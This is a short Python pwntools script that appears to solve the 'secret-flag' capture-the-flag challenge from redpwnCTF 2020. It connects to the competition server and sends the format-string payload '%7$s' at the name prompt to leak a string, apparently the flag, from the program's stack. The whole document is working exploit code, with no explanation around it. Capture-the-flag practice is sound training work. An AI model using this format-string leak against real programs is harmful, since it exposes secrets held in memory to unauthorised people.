#!/usr/bin/env python2
from pwn import *
import sys
context(os="linux", arch="amd64")
context.terminal = ['zsh', '-e', 'sh', '-c']

#p = process("./secret-flag")
p = remote("2020.redpwnc.tf", 31826)
p.readuntil('What is your name, young adventurer?')
p.sendline('%7$s')
print(p.recvall())
